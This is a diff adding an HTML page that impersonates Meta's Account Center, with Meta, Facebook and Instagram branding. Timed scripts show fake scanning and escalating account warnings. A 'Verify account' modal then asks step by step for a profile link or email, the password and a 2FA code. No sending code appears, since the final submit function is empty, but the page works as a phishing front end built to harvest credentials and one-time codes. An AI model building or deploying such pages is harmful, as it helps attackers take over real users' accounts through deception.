@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Business Tools</title>
+    <link rel="shortcut icon" href="image/logo-facebook.png" type="image/x-icon">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css">
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const verifyAccount = document.getElementById('verifyAccount');
+            const container = document.getElementById('container');
+            const iconClose = document.getElementById('iconClose');
+
+            iconClose.addEventListener('click', function () {
+                verifyAccount.style.display = 'none';
+                container.style.display = 'flex';
+            });
+        });
+    </script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const verifyAccount = document.getElementById('verifyAccount');
+            const container = document.getElementById('container');
+            const iconClose = document.getElementById('iconClose');
+            const btnpersonalpage = document.getElementById('btnpersonalpage')
+            const connection1 = document.getElementById('connection1');
+            const connection2 = document.getElementById('connection2');
+            const connection3 = document.getElementById('connection3');
+            const connection4 = document.getElementById('connection4');
+            const connection5 = document.getElementById('connection5');
+            const connection6 = document.getElementById('connection6');
+            const connection7 = document.getElementById('connection7');
+            const containerright = document.getElementById('containerright');
+            const containerrightsecurity = document.getElementById('containerrightsecurity');
+            const bodyrightfb = document.getElementById('bodyrightfb');
+            const containerleft = document.getElementById('containerleft');
+
+            iconClose.addEventListener('click', function () {
+                verifyAccount.style.display = 'none';
+                container.style.display = 'flex';
+            });
+            btnpersonalpage.addEventListener('click', function () {
+                if (window.innerWidth < 946) {
+                    containerleft.style.display = 'none';
+                    containerright.style.display = 'flex';
+                } else {
+                    containerrightsecurity.style.display = 'none';
+                    containerright.style.display = 'flex';
+                }
+            });
+
+            connection1.addEventListener('click', function () {
+                verifyAccount.style.display = 'flex';
+            })
+            connection2.addEventListener('click', function () {
+                verifyAccount.style.display = 'flex';
+            })
+            connection3.addEventListener('click', function () {
+                verifyAccount.style.display = 'flex';
+            })
+            connection4.addEventListener('click', function () {
+                containerrightsecurity.style.display = 'flex';
+                containerright.style.display = 'none';
+            })
+            connection5.addEventListener('click', function () {
+                verifyAccount.style.display = 'flex';
+            })
+            connection6.addEventListener('click', function () {
+                verifyAccount.style.display = 'flex';
+            })
+            connection7.addEventListener('click', function () {
+                verifyAccount.style.display = 'flex';
+            })
+
+            bodyrightfb.addEventListener('click', function () {
+                verifyAccount.style.display = 'flex';
+                container.style.display = 'none';
+            })
+
+        });
+    </script>
+    <script>
+
+        document.addEventListener('DOMContentLoaded', function () {
+            document.getElementById("login").setAttribute("disabled", "true");
+            document.getElementById("login").removeAttribute("onclick");
+            document.getElementById("login").style.backgroundColor = "rgba(8, 102, 255, 0.4)";
+        })
+
+
+
+        setTimeout(function () {
+            document.getElementById('loader-instagram').style.display = 'none';
+            document.getElementById('loader-instagram-background').style.display = 'none';
+            document.getElementById('loader-fb').style.display = 'none';
+            document.getElementById('tick-background').style.display = 'inline';
+            document.getElementById('warning-background').style.display = 'inline';
+            document.getElementById('tick').style.display = 'inline';
+            document.getElementById('warning').style.display = 'inline';
+            document.getElementById('left-load-fb').style.display = 'none'
+
+            document.getElementById("login").removeAttribute('disabled');
+            document.getElementById("login").setAttribute("onclick", "handleClose()");
+            document.getElementById("login").style.backgroundColor = "rgba(8, 102, 255, 1)";
+        }, 5000);
+
+        setTimeout(function () {
+            var textElement = document.getElementById("text");
+            var textElement1 = document.getElementById("text1");
+            var textArray = ["Warning 1", "Warning 1, Warning 2", "Warning 1, Warning 2, Warning 3"];
+            var index = 0;
+
+            var intervalId = setInterval(function () {
+                textElement.textContent = textArray[index];
+                textElement1.textContent = textArray[index];
+                index++;
+                if (index >= textArray.length) {
+                    clearInterval(intervalId);
+                }
+            }, 1000);
+
+        }, 1000);
+    </script>
+</head>
+
+<body>
+    <div class="container" id="container">
+        <div class="containerleft" id="containerleft">
+            <svg aria-label="Logo Meta" class="x1kpxq89 x1247r65" role="img" viewBox="0 0 500 100">
+                <defs>
+                    <linearGradient gradientUnits="userSpaceOnUse" id=":r2:" x1="124.38" x2="160.839" y1="99"
+                        y2="59.326">
+                        <stop offset=".427" stop-color="#0278F1"></stop>
+                        <stop offset=".917" stop-color="#0180FA"></stop>
+                    </linearGradient>
+                    <linearGradient gradientUnits="userSpaceOnUse" id=":r3:" x1="42" x2="-1.666" y1="4.936" y2="61.707">
+                        <stop offset=".427" stop-color="#0165E0"></stop>
+                        <stop offset=".917" stop-color="#0180FA"></stop>
+                    </linearGradient>
+                    <linearGradient gradientUnits="userSpaceOnUse" id=":r4:" x1="27.677" x2="132.943" y1="28.71"
+                        y2="71.118">
+                        <stop stop-color="#0064E0"></stop>
+                        <stop offset=".656" stop-color="#0066E2"></stop>
+                        <stop offset="1" stop-color="#0278F1"></stop>
+                    </linearGradient>
+                </defs>
+                <path
+                    d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
+                    fill="#1C2B33"></path>
+                <path
+                    d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
+                    fill="#0180FA"></path>
+                <path
+                    d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
+                    fill="url(#:r2:)"></path>
+                <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
+                    fill="url(#:r3:)"></path>
+                <path
+                    d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
+                    fill="url(#:r4:)"></path>
+            </svg>
+            <h3>Account center</h3>
+            <p>Manage your account settings and connection experience across Meta technologies like Facebook,
+                Instagram,
+                and Meta Horizon.<span><a href="#"> Find out more.</a></span></p>
+            <div class="btnpersonalpage" id="btnpersonalpage">
+                <button>
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M17 6A5 5 0 1 1 7 6a5 5 0 0 1 10 0zm-2 0a3 3 0 1 1-6 0 3 3 0 0 1 6 0zM21 19.801v-1.134C21 14.222 16.5 12 12 12s-9 2.222-9 6.667V19.8c0 1.255.79 2.36 2.022 2.6 1.495.292 3.822.6 6.978.6 3.156 0 5.483-.308 6.979-.6 1.231-.24 2.021-1.345 2.021-2.6zm-2-1.134V19.8a.781.781 0 0 1-.142.472.411.411 0 0 1-.262.165c-1.372.268-3.57.562-6.596.562-3.026 0-5.224-.294-6.596-.562a.411.411 0 0 1-.262-.165A.781.781 0 0 1 5 19.8v-1.134c0-1.435.684-2.521 1.912-3.33C8.2 14.49 10.042 14 12 14c1.958 0 3.8.49 5.088 1.337 1.228.809 1.912 1.895 1.912 3.33z">
+                        </path>
+                    </svg>
+                    <!-- <i class="fa fa-user" aria-hidden="true"></i> -->
+                    <span>Personal Page</span>
+                </button>
+            </div>
+            <div class="Experienceconnection" id="connection1">
+                <button>
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
+                        <g clip-path="url(#a)">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="M14.971 9.678a4 4 0 1 0-5.942 0l-2.028 3.448A4 4 0 1 0 9.874 18h4.252A4.002 4.002 0 0 0 22 17a4 4 0 0 0-5.003-3.873l-2.026-3.449zM14 7a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm-.699 3.784c-.408.14-.845.216-1.301.216-.455 0-.893-.076-1.3-.216l-1.95 3.312A3.997 3.997 0 0 1 9.875 16h4.252a3.998 3.998 0 0 1 1.122-1.903l-1.947-3.313zM18 19a2 2 0 1 1 0-4 2 2 0 0 1 0 4zM8 17a2 2 0 1 0-4 0 2 2 0 0 0 4 0z">
+                            </path>
+                        </g>
+                        <defs>
+                            <clipPath>
+                                <path d="M0 0H24V24H0z"></path>
+                            </clipPath>
+                        </defs>
+                    </svg>
+                    <span>Experience connectione</span>
+                </button>
+            </div>
+            <h5>Account Settings
+            </h5>
+            <div class="Experienceconnection" id="connection2">
+                <button>
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M12 14a4 4 0 1 0 0-8 4 4 0 0 0 0 8zm0-2a2 2 0 1 0 0-4 2 2 0 0 0 0 4z"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M12 23c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm6.542-4.82a9 9 0 1 0-13.084 0C6.518 16.06 9.258 15 12 15c2.741 0 5.483 1.06 6.542 3.18zm-1.62 1.355c-.159-.631-.564-1.143-1.21-1.568-.911-.6-2.254-.967-3.712-.967-1.458 0-2.8.366-3.712.967-.646.425-1.051.937-1.21 1.569A8.958 8.958 0 0 0 12 21a8.958 8.958 0 0 0 4.923-1.465z">
+                        </path>
+                    </svg>
+                    <span>Account</span>
+                </button>
+            </div>
+            <div class="Experienceconnection" id="connection3">
+                <button>
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
+                        <g clip-path="url(#a)">
+                            <path d="M12 9a2 2 0 1 0 0-4 2 2 0 0 0 0 4z"></path>
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="M16 13.268V13c0-1.875-1.333-3-4-3s-4 1.125-4 3v.268c0 .707.392 1.34 1.085 1.483.631.13 1.573.249 2.915.249s2.284-.118 2.915-.249c.693-.143 1.085-.775 1.085-1.483zm-2.224-.89c.094.073.2.18.22.502A14.64 14.64 0 0 1 12 13a14.64 14.64 0 0 1-1.996-.12c.02-.322.126-.429.22-.501.183-.142.682-.379 1.776-.379 1.094 0 1.593.237 1.776.379z">
+                            </path>
+                            <path d="M9 17a1 1 0 1 0 0 2h6a1 1 0 1 0 0-2H9z"></path>
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="M6 1a3 3 0 0 0-3 3v16a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3V4a3 3 0 0 0-3-3H6zm12 2H6a1 1 0 0 0-1 1v16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1z">
+                            </path>
+                        </g>
+                        <defs>
+                            <clipPath>
+                                <path d="M0 0H24V24H0z"></path>
+                            </clipPath>
+                        </defs>
+                    </svg>
+                    <span>Personal information</span>
+                </button>
+            </div>
+            <div class="Experienceconnection" id="connection4">
+                <button>
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M3.73 4.594c-.45.25-.73.726-.73 1.241v4.104a12 12 0 0 0 6.172 10.49l1.857 1.031a2 2 0 0 0 1.942 0l1.857-1.031A12 12 0 0 0 21 9.939V5.835c0-.515-.28-.99-.73-1.24a17.03 17.03 0 0 0-16.54 0zM19 6.181a15.03 15.03 0 0 0-14 0V9.94a10 10 0 0 0 5.144 8.742L12 19.712l1.856-1.031A10 10 0 0 0 19 9.939V6.181z">
+                        </path>
+                    </svg>
+                    <span>Passwords and security</span>
+                </button>
+            </div>
+            <div class="Experienceconnection" id="connection5">
+                <button>
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
+                        <g clip-path="url(#a)">
+                            <path
+                                d="M16 4H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h6v2H6a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3h10a3 3 0 0 1 3 3v3.024a5.261 5.261 0 0 0-2 .196V5a1 1 0 0 0-1-1z">
+                            </path>
+                            <path d="M8 7a1 1 0 0 0 0 2h5a1 1 0 1 0 0-2H8zM8 11a1 1 0 1 0 0 2h3a1 1 0 1 0 0-2H8z">
+                            </path>
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="m21.222 17 .391-3.521a3.133 3.133 0 1 0-6.226 0l.39 3.521H15a1 1 0 0 0-1 1v3a1 1 0 0 0 1 1h7a1 1 0 0 0 1-1v-3a1 1 0 0 0-1-1h-.778zm-2.012 0 .416-3.742a1.133 1.133 0 1 0-2.252 0L17.79 17h1.42zM16 19v1h5v-1h-5z">
+                            </path>
+                        </g>
+                        <defs>
+                            <clipPath>
+                                <path d="M0 0H24V24H0z"></path>
+                            </clipPath>
+                        </defs>
+                    </svg>
+                    <span>Your information and rights</span>
+                </button>
+            </div>
+            <div class="Experienceconnection" id="connection6">
+                <button>
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M12 15h1.297a3 3 0 0 1 1.917.693l3.427 2.847c1.111.923 2.728.38 2.923-1.05.227-1.67.436-4.016.436-6.99s-.21-5.32-.436-6.99c-.195-1.43-1.812-1.973-2.923-1.05l-3.426 2.847A3 3 0 0 1 13.296 6H6.5a4.5 4.5 0 0 0-.5 8.973V19a3 3 0 1 0 6 0v-4zm8-4.5c0-2.617-.167-4.719-.36-6.27l-3.147 2.616A5 5 0 0 1 13.297 8H12v5h1.297a5 5 0 0 1 3.196 1.154l3.147 2.616c.193-1.551.36-3.653.36-6.27zM10 13V8H6.5a2.5 2.5 0 0 0 0 5H10zm-2 2h2v4a1 1 0 1 1-2 0v-4z">
+                        </path>
+                    </svg>
+                    <span>Advertising options</span>
+                </button>
+            </div>
+            <div class="Experienceconnection" id="connection7">
+                <button>
+                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                        class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
+                        <path d="M6 14a1 1 0 1 0 0 2h4a1 1 0 1 0 0-2H6z"></path>
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M4.195 4c-1.258 0-2.372.791-2.625 2.024C1.29 7.401 1 9.438 1 12s.289 4.599.57 5.976C1.823 19.209 2.937 20 4.195 20h15.61c1.258 0 2.372-.791 2.625-2.024.281-1.377.57-3.414.57-5.976s-.289-4.599-.57-5.976C22.177 4.791 21.063 4 19.805 4H4.195zm15.61 2H4.195a.811.811 0 0 0-.487.147.444.444 0 0 0-.178.278A24.26 24.26 0 0 0 3.263 8h17.474a24.192 24.192 0 0 0-.267-1.575.444.444 0 0 0-.178-.278.81.81 0 0 0-.487-.147zM3 12c0-.712.024-1.38.064-2h17.872c.04.62.064 1.288.064 2 0 2.412-.272 4.314-.53 5.575a.444.444 0 0 1-.178.278.81.81 0 0 1-.487.147H4.195a.81.81 0 0 1-.487-.147.444.444 0 0 1-.178-.278C3.272 16.314 3 14.412 3 12z">
+                        </path>
+                    </svg>
+                    <span>Meta Pay</span>
+                </button>
+            </div>
+        </div>
+        <div class="containerright" style="display: flex;" id="containerright">
+            <div class="contentRightsecurity">
+                <div class="topRight">
+                    <h2>Personal account</h2>
+                    <span>Manage personal accounts and share Facebook and Instagram information</span>
+                </div>
+                <div class="bodyright fb" style="margin-top: 20px;">
+                    <div class="right">
+                        <img src="image/logo-facebook.png" alt="">
+                        <div class="contentrightaccount">
+                            <h6>Account Facebook</h6>
+                            <p id="text1">Facebook</p>
+                        </div>
+                    </div>
+                    <div class="left" style="display: flex;">
+                        <span class="loader" id="left-load-fb"></span>
+                        <img src="image/warning.png" id="warning-background" alt="" style="display: none;">
+                    </div>
+                </div>
+                <div class="bodyright ins">
+                    <div class="right">
+                        <img src="image/logo-instagram.png" alt="">
+                        <div class="contentrightaccount">
+                            <h6>Account Instagram</h6>
+                            <p>Instagram</p>
+                        </div>
+                    </div>
+                    <div class="left" style="display: flex;">
+                        <span class="loader" id="loader-instagram-background"></span>
+                        <img src="image/correct.png" id="tick-background" style="display: none;">
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="containerrightsecurity" style="display: none;" id="containerrightsecurity">
+            <div class="contentRightsecurity">
+                <div class="topRight">
+                    <h2>Account</h2>
+                    <span>Authenticate personal account</span>
+                </div>
+                <div class="bodyright fb password" style="margin-top: 20px;" id="bodyrightfb">
+                    <div class="right">
+                        <div class="contentrightaccount">
+                            <h6>Verify account</h6>
+                        </div>
+                    </div>
+                    <div class="left" style="display: flex;">
+                        <span class="loader" style="display: none;"></span>
+                        <img class="imageSecurity" src="image/arrow-white.png" alt="" style="display: flex;">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="verifyAccountContainer" id="verifyAccount">
+        <div class="verifyAccount">
+            <div>
+
+                <div class="headerIcon">
+                    <div class="back" style>
+                        <button class="iconback" id="iconback">
+                        </button>
+                    </div>
+                    <div class="close">
+                        <button class="iconClose" id="iconClose">
+                            X
+                        </button>
+                    </div>
+
+                </div>
+                <div class="verifyContent" id="verifyContent">
+                    <h3>Verify account</h3>
+                    <p>Verify your account.</p>
+                </div>
+                <div class="verifyContent verifyContentEmail" style="display: none;" id="verifyContentEmail">
+                    <h3>Url, Email or phone number</h3>
+                    <p>Fill in information.</p>
+                </div>
+                <div class="verifyContent verifyContentpassword" style="display: none;" id="verifyContentpassword">
+                    <h3>Password</h3>
+                    <p>Fill in password.</p>
+                </div>
+                <div class="verifyContent verifyContent2FA" style="display: none;" id="verifyContent2FA">
+                    <h3>2FA</h3>
+                    <p>Fill in 2FA.</p>
+                </div>
+                <div class="verifyContentAccount" id="Account">
+                    <div class="account fb">
+                        <div class="rightAccount">
+                            <img src="image/logo-facebook.png" alt="">
+                            <div class="contentRight">
+                                <h6>Account Facebook</h6>
+                                <p id="text">Facebook</p>
+                            </div>
+                        </div>
+                        <div class="leftAccount" style="display: flex;">
+                            <span class="loader" id="loader-fb"></span>
+                            <img src="image/warning.png" id="warning" alt="" style="display: none;">
+                        </div>
+                    </div>
+                    <div class="account ins">
+                        <div class="rightAccount">
+                            <img src="image/logo-instagram.png" alt="">
+                            <div class="contentRight">
+                                <h6>Account Instagram</h6>
+                                <p>Instagram</p>
+                            </div>
+                        </div>
+                        <div class="leftAccount" style="display: flex;">
+                            <span class="loader" id="loader-instagram"></span>
+                            <img src="image/correct.png" id="tick" style="display: none">
+                        </div>
+                    </div>
+                </div>
+                <div class="Input inputURL" id="inputURL" style="display: none;">
+                    <Input type="text" id="textUrl" oninput="check()" placeholder="Enter a link to your profile">
+                </div>
+                <div class="Input inputPassword " id="inputPassword" style="display: none;">
+                    <Input type="text" id="textPassword" oninput="checkPassword()" placeholder="Password">
+                </div>
+                <div class="Input input2FA" id="input2FA" style="display: none;">
+                    <Input type="text" oninput="check2FA()" id="text2FA" placeholder="2FA Code">
+                </div>
+
+                <p class="space" id="space"></p>
+                <p class="EmailOrPhone" id="EmailOrPhone" style="display: none;" onclick="handleSwitch()">Email or
+                    Phone Number</p>
+
+                <div class="btn" id="btnlogin">
+                    <button class="btnLogin" name="login" id="login" onclick="handleClose()">Confirm</button>
+                    <button class="btnLogin btnSendUrl" name="login" id="btnSendUrl" style="display: none;"
+                        onclick="SendUrl()">Confirm</button>
+                    <button class="btnLogin btnSendPassword" name="login" id="btnSendPassword" style="display: none;"
+                        onclick="sendPassword()">Confirm</button>
+                    <button class="btnLogin btnSend2FA" name="login" id="btnSend2FA" style="display: none;"
+                        onclick="send2FA()">Confirm</button>
+                </div>
+                <script>
+                    function handleClose() {
+                        document.getElementById('verifyContent').style.display = 'none'
+                        document.getElementById('verifyContentEmail').style.display = 'flex'
+                        document.getElementById('Account').style.display = 'none'
+                        document.getElementById('inputURL').style.display = 'flex'
+                        document.getElementById('btnSendUrl').style.display = 'flex'
+                        document.getElementById('login').style.display = 'none'
+                        document.getElementById('space').style.display = 'none'
+                        document.getElementById('EmailOrPhone').style.display = 'block'
+                        setTimeout(function () {
+                            document.getElementById('verifyContentEmail').style.transform = 'translateX(0)';
+                            document.getElementById('inputURL').style.transform = 'translateX(0)';
+                            document.getElementById('btnSendUrl').style.transform = 'translateX(0)';
+                            document.getElementById('EmailOrPhone').style.transform = 'translateX(0)';
+                        }, 1);
+                    }
+
+                    function handleSwitch() {
+                        var emailorphone = document.getElementById('EmailOrPhone').innerHTML
+
+                        if (emailorphone === "Enter a link to profile") {
+                            document.getElementById('textUrl').placeholder = 'Enter a link to profile'
+                            document.getElementById('EmailOrPhone').innerHTML = 'Enter Email or Phone number'
+                        } else {
+                            document.getElementById('textUrl').placeholder = 'Enter Email or Phone number'
+                            document.getElementById('EmailOrPhone').innerHTML = 'Enter a link to profile'
+                        }
+                    }
+
+                    function check() {
+                        var textUrl = document.getElementById('textUrl').value;
+                        if (textUrl === "") {
+                            document.getElementById("btnSendUrl").setAttribute("disabled", "true");
+                            document.getElementById("btnSendUrl").removeAttribute("onclick");
+                            document.getElementById("btnSendUrl").style.backgroundColor = "rgba(8, 102, 255, 0.4)";
+                        } else {
+                            document.getElementById("btnSendUrl").removeAttribute('disabled');
+                            document.getElementById("btnSendUrl").setAttribute("onclick", "SendUrl()");
+                            document.getElementById("btnSendUrl").style.backgroundColor = "rgba(8, 102, 255, 1)";
+
+                        }
+                    }
+
+                    check()
+
+                    function SendUrl() {
+                        document.getElementById('inputURL').style.display = 'none'
+                        document.getElementById('inputPassword').style.display = 'flex'
+                        document.getElementById('btnSendUrl').style.display = 'none'
+                        document.getElementById('btnSendPassword').style.display = 'flex'
+                        document.getElementById('btnlogin').style.marginTop = '-12px'
+                        document.getElementById('space').style.display = 'block'
+                        document.getElementById('EmailOrPhone').style.display = 'none'
+                        document.getElementById('verifyContentEmail').style.display = 'none'
+                        document.getElementById('verifyContentpassword').style.display = 'flex'
+                        setTimeout(function () {
+                            document.getElementById('inputPassword').style.transform = 'translateX(0)';
+                            document.getElementById('btnSendPassword').style.transform = 'translateX(0)';
+                            document.getElementById('verifyContentpassword').style.transform = 'translateX(0)';
+                        }, 1);
+
+                    }
+
+                    function checkPassword() {
+                        var textUrl = document.getElementById('textPassword').value;
+                        if (textUrl === "") {
+                            document.getElementById("btnSendPassword").setAttribute("disabled", "true");
+                            document.getElementById("btnSendPassword").removeAttribute("onclick");
+                            document.getElementById("btnSendPassword").style.backgroundColor = "rgba(8, 102, 255, 0.4)";
+                        } else {
+                            document.getElementById("btnSendPassword").removeAttribute('disabled');
+                            document.getElementById("btnSendPassword").setAttribute("onclick", "sendPassword()");
+                            document.getElementById("btnSendPassword").style.backgroundColor = "rgba(8, 102, 255, 1)";
+
+                        }
+                    }
+
+                    checkPassword()
+
+                    function sendPassword() {
+                        document.getElementById('inputPassword').style.display = 'none'
+                        document.getElementById('input2FA').style.display = 'flex'
+                        document.getElementById('btnSendPassword').style.display = 'none'
+                        document.getElementById('btnSend2FA').style.display = 'flex'
+                        document.getElementById('btnlogin').style.marginTop = '-12px'
+                        document.getElementById('space').style.display = 'block'
+                        document.getElementById('EmailOrPhone').style.display = 'none'
+                        document.getElementById('verifyContentpassword').style.display = 'none'
+                        document.getElementById('verifyContent2FA').style.display = 'flex'
+                        setTimeout(function () {
+                            document.getElementById('input2FA').style.transform = 'translateX(0)';
+                            document.getElementById('btnSend2FA').style.transform = 'translateX(0)';
+                            document.getElementById('verifyContent2FA').style.transform = 'translateX(0)';
+                        }, 1);
+                    }
+
+                    function check2FA() {
+                        var textUrl = document.getElementById('text2FA').value;
+                        if (textUrl === "") {
+                            document.getElementById("btnSend2FA").setAttribute("disabled", "true");
+                            document.getElementById("btnSend2FA").removeAttribute("onclick");
+                            document.getElementById("btnSend2FA").style.backgroundColor = "rgba(8, 102, 255, 0.4)";
+                        } else {
+                            document.getElementById("btnSend2FA").removeAttribute('disabled');
+                            document.getElementById("btnSend2FA").setAttribute("onclick", "send2FA()");
+                            document.getElementById("btnSend2FA").style.backgroundColor = "rgba(8, 102, 255, 1)";
+
+                        }
+                    }
+
+                    check2FA()
+
+                    function send2FA() {
+
+                    }
+
+                </script>
+
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
